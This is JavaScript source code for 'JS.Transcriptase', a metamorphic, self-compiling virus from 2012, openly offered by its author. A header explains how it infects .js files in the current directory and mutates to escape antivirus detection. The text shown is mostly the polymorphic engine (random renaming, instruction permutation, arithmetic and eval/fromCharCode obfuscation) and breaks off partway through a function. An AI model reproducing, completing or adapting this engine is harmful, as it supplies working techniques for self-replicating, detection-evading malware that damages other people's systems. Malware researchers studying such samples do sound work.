//////////////////////////////////////////////////////////////////////////////
//
//  JS.Transcriptase
//  by Second Part To Hell
//  December 2012
//
//  This is a metamorphic self-compiling virus written in JavaScript.
// 
//  The virus consists of two parts:
//      1) The whole virus-code written in (obfuscated) JavaScript language
//      2) The whole virus-code written in a special meta-level language
//
//  The JavaScript-code (as well as the meta-level code) consists of a compiler
//  and an infection algorithm. At execution, the JavaScript-written compiler
//  analyses the meta-level code and derives a new JavaScript code for the next
//  generation (and infect potential victims with that code). The meta-level
//  code is integrated to the new derived generation in a fully obfuscated way.
//
//  The derivation of the new generation works with the following three steps:
//
//  1) PreCompilation
//     1.1) Change of variable and function names
//          Every defined function and variable gets a random name
//
//     1.2) Permutation
//          The order of every instruction in the code and in all sub-branches
//          are choosen randomly - except of connected instructions. Those
//          restrictions are defined in the meta-level code.
//
//     1.3) Creation of random numeric functions
//          A set of up to 35 functions with 1 to 5 inputs are created, which
//          contains arithmetic calculations (+,-,*,/,%) are created. Those will
//          be used for replacing numerical values of 0 to 255.
//
//          Example: 
//          function msbxaegrgbfqutl(pllwlqvevm,zorelhvsak,zpzrdbuy,rhuuwrxdj){return (36+zpzrdbuy)+(98+((zorelhvsak-(219-((17-(21%(rhuuwrxdj*10)))-pllwlqvevm)))-rhuuwrxdj))}
//          msbxaegrgbfqutl(161,184,152,9) gives 77
//          msbxaegrgbfqutl(227,205,255,88)) gives 56
//
//
//  2) Code-Creation
//     For every instruction in the meta-code, corresponding instructions of
//     JavaScript are created.
//
//     2.1) Every object, every expression, every number and every string will
//          be derived in a random way.
//
//          Numbers can become calculations, replaced by random numeric function
//                  calls, return values of usual functions or variables.
//          Strings can be splitted into substrings. They can become String.fromCharCode(),
//                  variables or functions.                   
//          Expressions can become eval(...), variables or functions.
//          Objects/Methods can be splitted: object.method() -> somefunc().method()
//
//     2.2) Instructions like "while" or "if" can be exchanged by "for" or
//          "switch/case". WScript.CreateObject/new ActiveXObject can be used
//          vise versa. The condition of if/while can change the logic from
//                   if(a>b) <-> if(b<a) or while(a==b) <-> while(b==a)
//
//          Calculation with numbers/strings is random. For example, increasing
//          a number by one can become (in addition to all mutations from 2.1):
//                       number++; number+=1; number=number+1
//
//          or adding strings:
//                       string1=string1+string2; string1+=string2;
//
//
//  3) Integration
//     The final step includes all variables and functions at random places in
//     the code. Functions can be included at every place (in the global scope),
//     variables are restricted to places before they are used for the first
//     time.
//     In addition, some random variables and functions can be bundled into
//     function-arrays; for example:
//
//        var1=17; var2="Hello VXers!"; if(var1>12){WScript.Echo(var2)}
//                                      ->
//        somearray=[function(){return("Hello VXers!")},17}];
//        if(somearray[1]>12){WScript.Echo(somearray[0]()}
//
//
//  In the end, the virus will search for .JS files in the current directory
//  and prepends the next generation.     
//
//
//  A more detailed explanation of this project can be found in an article
//  called "Metamorphism and Self-Compilation in JavaScript", in valhalla#3.
//
//  The code below is a dropper for a first generation virus. When executing, it
//  creates a file called "Transcript1.js". This first generation does not
//  have all obfuscation features of the whole virus (for instance, the
//  variable/function-name randomization has been deactivated for some reason),
//  but "Transcript1.js" will infect .js files in the current directory with
//  the full obfuscated virus.
//
//  This is version 1 - that means there are hunderts of things to improve and
//  thousands of things to implement. When you have a self-compiling compiler,
//  you can do so many things that you could not even think about before! :)
//
//
//  "Transcriptase" is a process in micro-biology, where RNA code is translated
//  into DNA code. This process is mainly used by retro-viruses such as HIV to
//  infect cells (which are "written" in DNA). The mutation-rate of biologic
//  transcriptase is very high, which makes curing of HIV very difficult.
//  This code has a very similar strategy: It translates its meta-level
//  code (RNA) into JavaScript code (DNA) to infect files (cells). The muation 
//  rate is very high as well, to circumvent detection :) 
//
//
//  Tested the code at WindowsXP and Windows7. Derivation of the next generation
//  takes a couple of minutes (3-10mins usually) due to unoptimized functions
//  and complex algorithms.
//  
//
//  I thank hh86 for the constant motivation over this long period of time from
//  starting until fixing the last monster-bugs, and for the perfect name... :)
//
//////////////////////////////////////////////////////////////////////////////


nnn=s(13)+s(10);                                                
function s(n){return(String.fromCharCode(n));}  // fGiveMeString
function r(n){return(Math.floor(Math.random()*n));} // fGiveRandomNumber

function randomString() // fGiveRandomString
{
    var rndString='';                                                                                                                                                     
    var RNum3=Math.floor(Math.random()*10)+6;
    for(var i=0;i<RNum3;i++)
    {
        rndString+=s(Math.floor(Math.random()*26)+97);
    }
    return(rndString);
}


function isNumber(String2Check) //fIsNumber
{
    if(String2Check.charCodeAt(0)>47&&String2Check.charCodeAt(0)<58)
    {
        return(1);
    }
    return(0);
}

function GetAntiLogic(operator)  //fGetAntiLogic
{
    var RValue=operator;
    if(operator=='<'){RValue='>';}
    if(operator=='<='){RValue='>=';}
    if(operator=='>'){RValue='<';}
    if(operator=='>='){RValue='<=';}
    return(RValue);
}


function RemoveVariableMask(CodeStringWithMask) // fRemoveVariableMask 
{    
    while(CodeStringWithMask.indexOf('°+')!=-1||CodeStringWithMask.indexOf('+°')!=-1)
    {
        CodeStringWithMask=CodeStringWithMask.replace('°+','');
        CodeStringWithMask=CodeStringWithMask.replace('+°','');
    }
    return(CodeStringWithMask);
}



function RandomizeFunction(a,b) // fRandomizeFunction
{
    return(Math.random()*2-1)
}


function CreateNumeric(OriginalNum)  // fCreateNumeric
{
    return(OriginalNum) // debugging
    OriginalNum=parseInt(OriginalNum,10);
    
    var CreateNumericType=Math.floor(Math.random()*20);    
    
    if(OriginalNum>10000)
    {
        CreateNumericType=5;    // no calculations with big numbers
    }
    if(OriginalNum>=0&&OriginalNum<=255&&Math.floor(Math.random()*4)!=0)
    {
         var FAElement=FullArray[OriginalNum].length;
         return(FullArray[OriginalNum][Math.floor(Math.random()*FAElement)]);
    }

    var CreateNumericRnd=Math.abs(Math.floor(Math.random()*0.9*OriginalNum))+1;

    if(OriginalNum<CreateNumericRnd&&CreateNumericType==0)
    {
        return(DeriveVC(OriginalNum,86));
    }
    if(CreateNumericType==0)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum-CreateNumericRnd)+'+'+CreateNumeric(CreateNumericRnd),200)+')');
    }
    if(CreateNumericType==1)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum+CreateNumericRnd)+'-'+CreateNumeric(CreateNumericRnd),200)+')');
    }
    if(CreateNumericType==2)
    {
        return('('+DeriveVC(CreateNumeric(OriginalNum*CreateNumericRnd)+'/'+CreateNumeric(CreateNumericRnd),200)+')');
    }

    return(DeriveVC(OriginalNum,86));    
}


function CreateLogic(LogicValues)  // fCreateLogic
{
// LogicValue=VC!VC!operator
    DeriveRestrString=''; // clear it
    var argument1     =LogicValues.substring(0,LogicValues.indexOf('!'));
    var argument2     =LogicValues.substring(LogicValues.indexOf('!')+1,LogicValues.indexOf('?'));
    var logicoperator =LogicValues.substring(LogicValues.indexOf('?')+1);
    var antilogic     =GetAntiLogic(logicoperator);
  
    CLDeriv=DeriveRestrictVC;     // use function-references
    if(isNumber(argument2)==1){CLDeriv=DeriveVC;}

    if(NoDerivation1==0)
    {
        argument1=DeriveRestrictVC(argument1,24);
    }
    argument2=CLDeriv(argument2,24);

    RNum1=Math.floor(Math.random()*2);
    if(RNum1==0)
    {
        CreateLogicRV=argument1+logicoperator+argument2;
    }
    if(RNum1==1)
    {
        CreateLogicRV=argument2+antilogic+argument1;
    }    
    return(CreateLogicRV);
}



function DeriveVC(arg,probalility)  // fDeriveVC
{
    var RNum2=Math.floor(Math.random()*probalility);
    //RNum2=13;  // debugging
    if(RNum2<10) // VC -> value
    {
        var DVCTmpName=randomString();
        VarDefs.push(arg);
        VarNames.push(DVCTmpName);
        var Rname1=DeriveVC(DVCTmpName,60);
        return(Rname1);
    }
    return(arg);
}



function GetVariableList(CodeStringWithMask)  // fGetVariableList 
{    
    var VarListRV="";
    while(CodeStringWithMask.indexOf('°+')!=-1)   // collect variables in this code line
    {
        VarListRV+=CodeStringWithMask.substring(CodeStringWithMask.indexOf('°+'),CodeStringWithMask.indexOf('+°')+2)+","; // (ccc)
        CodeStringWithMask=CodeStringWithMask.replace('°+','');
        CodeStringWithMask=CodeStringWithMask.replace('+°','');
    }
    return("_*_*"+VarListRV.substring(0,VarListRV.length-1)+"*_*_")
}



function RemoveVariableIndicator(CodeStringWithMask)  // fRemoveVariableIndicator
{    
    while(CodeStringWithMask.indexOf('_*_*')!=-1)
    {
        CodeStringWithMask=CodeStringWithMask.substring(0,CodeStringWithMask.indexOf('_*_*'))+CodeStringWithMask.substring(CodeStringWithMask.indexOf('*_*_')+4);
    }
    return(CodeStringWithMask);
}


function DeriveRestrictVC(arg,probalility,novars)  // fDeriveRestrictVC   
{
    var WhichRnd=Math.floor(Math.random()*probalility)
    if(arg.toString().indexOf("eval(")!=-1){WhichRnd+=7;}      
    if(WhichRnd>10)
    {
        return(arg);
    }
    
    var RndString=randomString();
    if(WhichRnd>8&&novars!=1)
    {
        if(r(2)==0)
        {
            DeriveRestrString+="var "+RndString+'='+arg+'@;';
        }
        else
        {
            DeriveRestrString="var "+RndString+'='+arg+'@;'+DeriveRestrString;
        }
        return(RndString);
    }
    if(WhichRnd>6) // VC -> value
    {
        var VariableString=GetVariableList(arg.toString())
        arg=RemoveVariableMask(arg.toString());
        arg=RemoveVariableIndicator(arg);
        return('eval('+CreateString(arg)+')'+VariableString);
    }  
    var VariableList=[];
    var VariableListRnd=[];
    arg=CreateVariableListForFunctionCalls(arg,VariableList,VariableListRnd)
    FunctionNames.push(RndString);
    FunctionArgs.push('('+VariableListRnd.join()+')');
    FunctionDefs.push('return '+arg);
    var ReturnValue=VariableList.join('+°,°+');
    if(VariableList.length>0)
    {
        ReturnValue='°+'+ReturnValue+'+°';
    }
    return(RndString+'('+ReturnValue+')');
}



function CreateVariableListForFunctionCalls(CodeString,VarArrOrig,VarArrRnd)  // fCreateVariableListForFunctionCalls
{
    CopyexecCode=CodeString.toString();
    while(CopyexecCode.indexOf('°+')!=-1)   // collect variables in this code line
    {
        VarArrOrig.push(CopyexecCode.substring(CopyexecCode.indexOf('°+')+2,CopyexecCode.indexOf('+°')));
        CopyexecCode=CopyexecCode.substring(CopyexecCode.indexOf('+°')+2);
    }
    for(var i=0;i<VarArrOrig.length;i++)    // remove every variable with a new argument-name
    {
        var RandNameForFuncArg=randomString();
        VarArrRnd.push(RandNameForFuncArg);
        while(CodeString.indexOf(VarArrOrig[i])!=-1)
        {
            CodeString=CodeString.replace(VarArrOrig[i],RandNameForFuncArg);
        }
    }
    return(CodeString);
}


function CreateExecution(execCode,noFunctionCreation)  // fCreateExecution        
{
    var RNum4=Math.floor(Math.random()*8);

    if(noFunctionCreation==1)
    {
        RNum4=Math.floor(Math.random()*5);
    }
   
    if(RNum4<2)
    {
        return(execCode);
    }
    
    if(RNum4<5&&execCode.substring(0,7)!='return(')
    {        
        var VariableString=GetVariableList(execCode)
        execCode=RemoveVariableMask(execCode);
        execCode=RemoveVariableIndicator(execCode);                          
        return('eval('+CreateString(execCode)+')'+VariableString);
    }
    
    if(execCode.indexOf("eval(")!=-1){return(execCode);}
    
    var Rname5=randomString();

    if(RecordFunctionVariables==0)  // first initialisation
    {
        RecordFunctionFN=FunctionNames.length;
        RecordFunctionVN=VarNames.length;     
        FunctionVariableFctName.push(Rname5);
    }
    RecordFunctionVariables++;

    var VariableList=[];
    var VariableRndList=[];
    execCode=CreateVariableListForFunctionCalls(execCode,VariableList,VariableRndList)

    FunctionDefs.push(CreateExecution(execCode));
    FunctionNames.push(Rname5);
    FunctionArgs.push('('+VariableRndList.join()+')');
    RecordFunctionVariables--;

    if(RecordFunctionVariables==0)  // final summing up of variable/function names
    {
        RecordFctNames=FunctionNames.slice(RecordFunctionFN);
        RecordVarNames=VarNames.slice(RecordFunctionVN);
        FunctionVariableNameArray.push(RecordVarNames.concat(RecordFctNames));
    }

    var ReturnValue=VariableList.join('+°,°+');
    if(VariableList.length>0)
    {
        ReturnValue='°+'+ReturnValue+'+°';
    }

    if(execCode.substring(0,7)=='return(')
    {
        return('return '+Rname5+'('+ReturnValue+')')
    }

    return(Rname5+'('+ReturnValue+')');
}


function CreateString(plainString)  // fCreateString
{
    var InString=plainString;
    var RNum6=Math.floor(Math.random()*InString.length/6);
    if(InString.length>1000)               // new
    {
        RNum6=Math.floor(Math.random()*InString.length/50);
    }
    for(i=0;i<RNum6;i++)
    {
        RNum7=Math.floor(Math.random()*InString.length);
        InString=InString.substring(0,RNum7)+'@@'+InString.substring(RNum7);
    }
    while(InString.indexOf('@@@@')!=-1)    // just in 1st gen... may it help??
    {
        InString=InString.replace('@@@@','@@');
    }
    var SplitStr=InString.split('@@');
    var RVstring='';
    for(var j=0;j<SplitStr.length;j++)
    {
        var RNum8=Math.floor(Math.random()*20);
        RNum8=1;  // *** debug
        if(RNum8<5)
        {
            while(SplitStr[j].indexOf(s(39))!=-1)
            {
                SplitStr[j]=SplitStr[j].replace(s(39),s(35)+s(35)+s(35)+'+String.fromCharCode(39)+'+s(35)+s(35)+s(35))   // new             
            }
            while(SplitStr[j].indexOf(s(35)+s(35)+s(35))!=-1)            // new
            {
                SplitStr[j]=SplitStr[j].replace(s(35)+s(35)+s(35),s(39))       // new         
            }
            RVstring+=s(39)+SplitStr[j]+s(39)+'+';
        }
        if(RNum8>4&&RNum8<8)
        {
            var Rname6=randomString();
            VarDefs.push(CreateString(SplitStr[j]));
            VarNames.push(Rname6);
            RVstring+=DeriveVC(Rname6,24)+'+';
        }        
        if(RNum8>7)
        {
            var TmpCharCode='';
            for(k=0;k<SplitStr[j].length;k++)
            {
                TmpCharCode+=CreateNumeric(SplitStr[j].charCodeAt(k))+',';
            }
            TmpCharCode=TmpCharCode.substr(0,TmpCharCode.length-1);                     
            RVstring+='String.fromCharCode('+TmpCharCode+')+';
        }
    }
    return(RVstring.substring(0,RVstring.length-1));
}


function PreCompilation()  // fPreCompilation - not a function anymore
{
    // Make random bruteforce decryption functions

    FullArray=[];    
    for(var FillA=0;FillA<256;FillA++)
    {
        FullArray.push([FillA]);
    }
    
    for(var NumberOfFunctionCreation=0;NumberOfFunctionCreation<75;NumberOfFunctionCreation++)
    {
        F='(SOS)O(SOS)';
        while(F.indexOf('S')!=-1)
        {
            if(r(4)==0)
            {
                F=F.replace('S','(SOS)')
            }
            else
            {
                F=F.replace('S','X');
            }
        }
        
        while(F.indexOf('O')!=-1)
        {
            var OperatorArray=['+','+','-','-','*','%']
            F=F.replace('O',OperatorArray[r(6)]);
        }
        
        var FunctionArguments=[];
        var FunctionArgLength=r(4)+2;
        for(var RSc=0;RSc<FunctionArgLength;RSc++)
        {
            FunctionArguments.push(randomString());
        }
        
        while(F.indexOf('X')!=-1)
        {
            if(r(2)==0)
            {   
                F=F.replace('X',FunctionArguments[r(FunctionArguments.length)]);
            }
            else
            {
                F=F.replace('X',r(256));
            }
        }
        
        for(var VarCount=FunctionArguments.length;VarCount>=0;VarCount--)
        {
            if(F.indexOf(FunctionArguments[VarCount])==-1)
            {
                FunctionArguments.splice(VarCount,1);
            }
        }
        
        if(FunctionArguments.length>0)
        {
            var Fname=randomString();
            G='function '+Fname+'('+FunctionArguments.join()+'){return('+F+');}';
        
            eval(G);   
            var IsItAUsefulFunction=0;
            
            for(var EvalFctC=0;EvalFctC<100;EvalFctC++)
            {
                FFilledArguments=[]
                for(var FFc=0;FFc<FunctionArguments.length;FFc++)
                {
                    FFilledArguments.push(r(256))    
                }
                
                FCall=Fname+'('+FFilledArguments.join()+')';

                FResult=eval(FCall);   
                if(FResult>=0&&FResult<256)
                {
                    IsItAUsefulFunction=1;
                    FullArray[FResult].push(FCall);
                }
            }
            
            if(IsItAUsefulFunction==1)
            {
                FunctionDefs.push('return '+F);
                FunctionArgs.push('('+FunctionArguments.join()+')');  
                FunctionNames.push(Fname); 
            }
        }
    }   

    // Make some instruction definition
    while(MetaLevelLanguage.indexOf("$CreateObject$")!=-1)
    {
        if(Math.floor(Math.random()*2)==0)
        {
            MetaLevelLanguage=MetaLevelLanguage.replace("$CreateObject$","WScript#.CreateObject");
        }
        else
        {
            MetaLevelLanguage=MetaLevelLanguage.replace("$CreateObject$","new ActiveXObject");
        }
    }
    
      
    // Define random variable names 
    /*
    // This feature should not be activated in the 0th-generation dropper
    // because it might interfere with the "victory"-instruction, which is
    // responsible for including the metacode to the next generation. Therefor the
    // dropped output can can still be understood relatively simple (you can
    // compare the used variables with the variables in the meta-code and understand
    // further the code - this is how i did the first stage of bug-fixing), so it can
    // be used to learn about the mutations in general. This feature is just
    // deactivated in this 0-generation dropper - everything is fully activated
    // in every further generation. (in fact this is no fundamental problem, but
    // it could be solved relativly quick. but i'm just to lazy to optimize the
    // dropper :))    
    var CopyMetaLevelLanguage=MetaLevelLanguage;
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')var',')def');
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(var',')while(');   // also consider while(var VariableName=...)     
    CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(',')def');  
    while(CopyMetaLevelLanguage.indexOf(')def ')!=-1)
    {
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.substring(CopyMetaLevelLanguage.indexOf(')def ')+1);
        var VariableNameGlobal=CopyMetaLevelLanguage.substring(4,CopyMetaLevelLanguage.indexOf('='));
        var RandomVariableName=randomString();
        while(MetaLevelLanguage.indexOf(VariableNameGlobal)!=-1)
        {
            MetaLevelLanguage=MetaLevelLanguage.replace(VariableNameGlobal,RandomVariableName);
        }
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')var',')def');
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(var',')while(');
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.replace(')while(',')def');
    }


    // Define random function names
    var CopyMetaLevelLanguage=MetaLevelLanguage;
    while(CopyMetaLevelLanguage.indexOf(')function ')!=-1)
    {
        CopyMetaLevelLanguage=CopyMetaLevelLanguage.substring(CopyMetaLevelLanguage.indexOf(')function ')+1);
        var FunctionName=CopyMetaLevelLanguage.substring(9,CopyMetaLevelLanguage.indexOf('('));
        var RandomVariableName=randomString();
        while(MetaLevelLanguage.indexOf(FunctionName)!=-1)
        {
            MetaLevelLanguage=MetaLevelLanguage.replace(FunctionName,RandomVariableName);
        }
        FctArguments=CopyMetaLevelLanguage.substring(CopyMetaLevelLanguage.indexOf('(')+1,CopyMetaLevelLanguage.indexOf(')'));
        var SingleFArguments="";
        if(FctArguments.length>0)
        {
            SingleFArguments=FctArguments.split(',');
        }
        for(var i=0;i<SingleFArguments.length;i++)
        {
            var RandomVariableNameArgs=randomString();
            while(MetaLevelLanguage.indexOf(SingleFArguments[i])!=-1)
            {
                MetaLevelLanguage=MetaLevelLanguage.replace(SingleFArguments[i],RandomVariableNameArgs);
            }
        }
    } */
}


function Permutator(MLL)  // fPermutator
{
    var InfoCodeArray=[];
    var PermIdentifier=[];
    var RequiredCodes=[];
    var MLLcount=0;
    for(var i=0; MLLcount<MLL.length; i++)
    {   
        PermIdentifier[i]=MLL[MLLcount].substring(MLL[MLLcount].indexOf('(')+1,MLL[MLLcount].indexOf('|'));
        RequiredCodes[i]=MLL[MLLcount].substring(MLL[MLLcount].indexOf('|')+1,MLL[MLLcount].indexOf(')'));
        InfoCodeArray[i]=[];
        InfoCodeArray[i][0]=MLL[MLLcount].substring(MLL[MLLcount].indexOf(')')+1);
        if(InfoCodeArray[i][0].substring(0,2)=='if')
        {
            var NumberOfLinesIf=parseInt(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1),10);
            InfoCodeArray[i]=InfoCodeArray[i].concat(Permutator(MLL.slice(MLLcount+1,MLLcount+NumberOfLinesIf+1)));
            MLLcount=MLLcount+NumberOfLinesIf+1;      // pointer to else-line (which contains the number of elements contained in else)
            
            var NumberOfLinesElse=parseInt(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1),10);            
            //WScript.Echo("MLL: "+ MLL+nnn+nnn+"NumberOfLinesIf: "+NumberOfLinesIf+nnn+"MLL[MLLcount]: "+MLL[MLLcount]+nnn+"NumberOfLinesElse: "+NumberOfLinesElse+nnn+"MLLcount: "+MLLcount)

            InfoCodeArray[i]=InfoCodeArray[i].concat(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1));   // add the else-number part
            if(NumberOfLinesElse>0)  // if there are lines in the else-part, add them
            {
                InfoCodeArray[i]=InfoCodeArray[i].concat(Permutator(MLL.slice(MLLcount+1,MLLcount+NumberOfLinesElse+1)));
            }
            MLLcount=MLLcount+NumberOfLinesElse;
        }
        if(InfoCodeArray[i][0].substring(0,5)=='while')
        {
            var NumberOfLinesWhile=parseInt(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1),10);
            InfoCodeArray[i]=InfoCodeArray[i].concat(Permutator(MLL.slice(MLLcount+1,MLLcount+NumberOfLinesWhile+1)));
            MLLcount=MLLcount+NumberOfLinesWhile;
        }
        if(InfoCodeArray[i][0].substring(0,9)=='function ')
        {
            var NumberOfLinesFunction=parseInt(MLL[MLLcount].substring(MLL[MLLcount].lastIndexOf(')')+1),10);
            InfoCodeArray[i]=InfoCodeArray[i].concat(Permutator(MLL.slice(MLLcount+1,MLLcount+NumberOfLinesFunction+1)));
            MLLcount=MLLcount+NumberOfLinesFunction;
        }
        MLLcount++;
    }
    RequiredCodes.push();
    var PermutatedCodeArray=[];
    while(InfoCodeArray.length>0)
    {
        var RandomElement=r(InfoCodeArray.length);     
        if(RequiredCodes.toString().indexOf(PermIdentifier[RandomElement])==-1)
        {
            PermutatedCodeArray=InfoCodeArray[RandomElement].concat(PermutatedCodeArray);
            InfoCodeArray.splice(RandomElement,1);
            PermIdentifier.splice(RandomElement,1);
            RequiredCodes.splice(RandomElement,1);
        }
    }
    return(PermutatedCodeArray.slice())
}


function CreateObjectExecution(InputObject)  // fCreateObjectExecution
{
    while(InputObject.indexOf(s(35)+s(79))!=-1)  // #ON
    {
        var ObjectNumber=InputObject.charAt(InputObject.indexOf(s(35)+s(79))+2)
        var FullObject=InputObject.substring(InputObject.indexOf(s(35)+s(79))+3,InputObject.indexOf(ObjectNumber+s(79)+s(35)));
        InputObject=InputObject.substring(0,InputObject.indexOf(s(35)+s(79)))+CreateObjectExecution(FullObject)+InputObject.substring(InputObject.indexOf(ObjectNumber+s(79)+s(35))+3);
    }
    while(InputObject.indexOf(s(35)+s(46))!=-1)
    {
        if(Math.floor(Math.random()*3)==0)            // object.method() -> f().methode()
        {   
            var ObjectName=randomString();
            
            var VariableList=[];
            var VariableListRnd=[];
            var ObjString=InputObject.substring(0,InputObject.indexOf(s(35)+s(46)));
            while(ObjString.indexOf(s(35)+s(120))!=-1)
            {
                var COEexecNum=ObjString.charAt(ObjString.indexOf(s(35)+s(120))+2);
                ObjString=ObjString.replace(s(35)+s(120)+COEexecNum,"");        // remove the #xN and Nx#
                ObjString=ObjString.replace(COEexecNum+s(120)+s(35),"");
            }
            ObjString=CreateVariableListForFunctionCalls(ObjString,VariableList,VariableListRnd)
            FunctionDefs.push('return '+ObjString);
            FunctionNames.push(ObjectName); 
            FunctionArgs.push('('+VariableListRnd.join()+')');
            
            var ReturnValue=VariableList.join('+°,°+');
            if(VariableList.length>0)
            {
                ReturnValue='°+'+ReturnValue+'+°';
            }
            InputObject=CreateObjectExecution(ObjectName+'('+ReturnValue+')'+InputObject.substring(InputObject.indexOf(s(35)+s(46))+1));
        }
        else
        {
            InputObject=CreateObjectExecution(InputObject.replace(s(35)+s(46),s(46)));           
        }
    }
    return(InputObject);    
}


function ExecutionParser(ExecString)  // fExecutionParser
{
    while(ExecString.indexOf(s(35)+s(120))!=-1)  // #xN
    {
        var ExecutionNumber=ExecString.charAt(ExecString.indexOf(s(35)+s(120))+2)
        //WScript.Echo("#x"+ExecutionNumber+nnn+nnn+ExecString)
        DeriveRestrString="";
        var newExecutionToReplace=ExecString.substring(ExecString.indexOf(s(35)+s(120))+3,ExecString.indexOf(ExecutionNumber+s(120)+s(35)));
        ExecString=ExecString.substring(0,ExecString.indexOf(s(35)+s(120)))+DeriveRestrictVC(ExecutionParser(newExecutionToReplace),100,1)+ExecString.substring(ExecString.indexOf(ExecutionNumber+s(120)+s(35))+3);
    }
    return(ExecString)
}


function CreateBlockOfCode(CodeBlockArray)  // fCreateBlockOfCode
{
    var RString='';
    var CodeLineIndex=0;
    var LocalVarName=[];
    var LocalVarDefs=[];
    HierarchyOfCalls++;
    while(CodeLineIndex<CodeBlockArray.length)
    {        
        var SingleElement=CodeBlockArray[CodeLineIndex];
        while(SingleElement.indexOf(s(35)+s(34))!=-1)  // #"                             
        {
            var newStringToReplace=SingleElement.substring(SingleElement.indexOf(s(35)+s(34))+2,SingleElement.indexOf(s(34)+s(35)));
            SingleElement=SingleElement.substring(0,SingleElement.indexOf(s(35)+s(34)))+CreateString(newStringToReplace)+SingleElement.substring(SingleElement.indexOf(s(34)+s(35))+2);
        }
        while(SingleElement.indexOf(s(35)+s(110))!=-1)  // #n
        {
            var newNumberStart=SingleElement.indexOf(s(35)+s(110))+2;                                                               // this line is worth 3h of bug searching :)
            var newNumberToReplace=SingleElement.substring(newNumberStart,SingleElement.indexOf(s(110)+s(35),newNumberStart));      
            SingleElement=SingleElement.substring(0,SingleElement.indexOf(s(35)+s(110)))+CreateNumeric(newNumberToReplace)+SingleElement.substring(SingleElement.indexOf(s(110)+s(35),newNumberStart)+2);
        }
        SingleElement=CreateObjectExecution(SingleElement);
        SingleElement=ExecutionParser(SingleElement);   
        if(SingleElement.substring(0,2)=='if')
        {
            //if(var1!var2?operator)NNN Code NNN AntiCode
            //if(i!2?==)002
            //WScript.Echo("i==1");    // in case of i==1
            //WScript.Echo("second line");
            //003
            //WScript.Echo("i!=1"); // in case of i!=1
            //WScript.Echo("2");
            //WScript.Echo("3");
            var condition             =SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.lastIndexOf(')'));
            var NumOfElementsCode     =parseInt(SingleElement.substring(SingleElement.lastIndexOf(')')+1),10);            
            var NumOfElementsAntiCode =parseInt(CodeBlockArray[CodeLineIndex+NumOfElementsCode+1],10);

            var ExecuteCode=CodeBlockArray.slice(CodeLineIndex+1,CodeLineIndex+NumOfElementsCode+1);
            var AntiCode   =CodeBlockArray.slice(CodeLineIndex+NumOfElementsCode+2,CodeLineIndex+NumOfElementsCode+NumOfElementsAntiCode+2);

            var LogicOperator =SingleElement.substring(SingleElement.indexOf('?')+1,SingleElement.lastIndexOf(')'));
            if(LogicOperator=='=='&&Math.floor(Math.random()*4)!=0)
            {
                var argument1     =SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.indexOf('!'));
                var argument2     =SingleElement.substring(SingleElement.indexOf('!')+1,SingleElement.indexOf('?'));
                var defcode='';
                if(AntiCode.length>0)
                {
                    defcode+='default:!@{'+CreateBlockOfCode(AntiCode)+'!@};break;'
                }
                RString+='switch('+argument1+')@{case '+argument2+':!@{'+CreateBlockOfCode(ExecuteCode)+';break;!@}'+defcode+'@}';                   
            }
            else
            {
                var elsecodeinclude='';
                if(AntiCode.length>0)
                {
                    elsecodeinclude='else@{'+CreateBlockOfCode(AntiCode)+'@}';
                }        
                var tmpLL=CreateLogic(condition)
                RString+=DeriveRestrString+'if('+tmpLL+')@{'+CreateBlockOfCode(ExecuteCode)+'@}'+elsecodeinclude; 
            }
            CodeLineIndex+=NumOfElementsCode+NumOfElementsAntiCode+2;
        }
        
        if(SingleElement.substring(0,5)=='while')
        {
            //while(initial$var1!var2?operator@action)NNNCode
            //
            //while(i=0$i!3?<@i=i+1)002
            //WScript.Echo("hrhr"+i);         // this will be loop'ed
            //WScript.Echo("second output that loops");
            var initial           =SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.indexOf('$'));
            var condition         =SingleElement.substring(SingleElement.indexOf('$')+1,SingleElement.indexOf('@'));
            var action            =SingleElement.substring(SingleElement.indexOf('@')+1,SingleElement.lastIndexOf(')'));
            var NumOfElementsCode =parseInt(SingleElement.substring(SingleElement.lastIndexOf(')')+1),10);  
            var ExecuteCode       =CodeBlockArray.slice(CodeLineIndex+1,CodeLineIndex+NumOfElementsCode+1);

            var RNum2=Math.floor(Math.random()*2);
            NoDerivation1=1;
            var RLogic=CreateLogic(condition)
            NoDerivation1=0;
            if(RNum2==0)
            {
                if(initial.length>0)
                {
                    LocalVarName.push(initial.substring(4,initial.indexOf('=')));                    
                    LocalVarDefs.push(initial.substring(initial.indexOf('=')+1));
                }
                RString+=DeriveRestrString+'while('+RLogic+')';
                RString+='@{'+CreateBlockOfCode(ExecuteCode);
                if(action.length>0)
                {
                    RString+=CreateExecution(action,1);
                }
                RString+='@}';
            }
            if(RNum2==1)
            {
                NoDerivation1=1;
                RString+=DeriveRestrString+'for('+initial+';'+RLogic+';'+action+')';                
                NoDerivation1=0;
                RString+='@{'+CreateBlockOfCode(ExecuteCode)+'@}';
            }
            CodeLineIndex+=NumOfElementsCode+1;
        }
        
        if(SingleElement.substring(0,1)=='c')
        {
            //cX1(var)
            //cXn(var1, var2)
            //c+s(string1, string2)
            // X=+/- plus/minus        
            var CalcCode='';

            if(SingleElement.substring(2,3)=='1')
            {
                var Variable1=SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.lastIndexOf(')'));
                var Variable2=1;
                if(Math.floor(Math.random()*3)==0)
                {
                    CalcCode=Variable1+'@@';
                }
            }
            else
            {
                var Variable1=SingleElement.substring(SingleElement.indexOf('(')+1,SingleElement.indexOf(','));
                var Variable2=SingleElement.substring(SingleElement.indexOf(',')+1,SingleElement.lastIndexOf(')'));                
            }
            DeriveRestrString='';            
            if(CalcCode=='')
            {
                var WhichCalc=Math.floor(Math.random()*2)
                if(WhichCalc==0)
                {
                    CalcCode=Variable1+'@='+DeriveRestrictVC(Variable2,20);
